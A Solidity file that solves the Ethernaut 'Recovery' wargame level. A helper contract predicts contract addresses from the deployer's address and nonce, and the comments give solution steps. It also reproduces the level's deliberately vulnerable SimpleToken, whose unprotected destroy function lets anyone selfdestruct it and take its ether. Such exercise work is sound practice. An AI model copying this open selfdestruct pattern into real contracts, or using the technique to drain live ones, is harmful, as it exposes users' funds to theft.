// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// solution
// call helper_for_hack -> get_contract_address_for_nonce1(recovery address) -> now you have address + source code of SimpleToken ->  load in remix (At address)  -> call destroy function



// for Understanding
// Ethernaut deployed recovery address -> automatic internal call created new instance of SimpleToken with uniquie & different address on every new instance call
// you can test 

contract helper_for_hack
{
    function get_contract_address_for_nonce0 (address i) public pure returns (address)
    {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94),i, bytes1(0x80))))));
    }

    function get_contract_address_for_nonce1(address i) public pure returns (address) //recovery address
    {
        return  address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94) ,          i         ,   bytes1(0x01))))));  
        //                                                          _________________________      ______________       _____________   
        //                                                           identify that this is an      sender_address        nounce
        //                                                           address

    } 
}

// for better understanding & testing purpose
contract recovery_then_internal_call_SimpleToken 
{
    function generateToken(string memory _name, uint256 _initialSupply) public returns(SimpleToken)
    {
        SimpleToken i= new SimpleToken(_name, msg.sender, _initialSupply);
        return i;
    }
}

contract Recovery 
{
  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken 
{
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}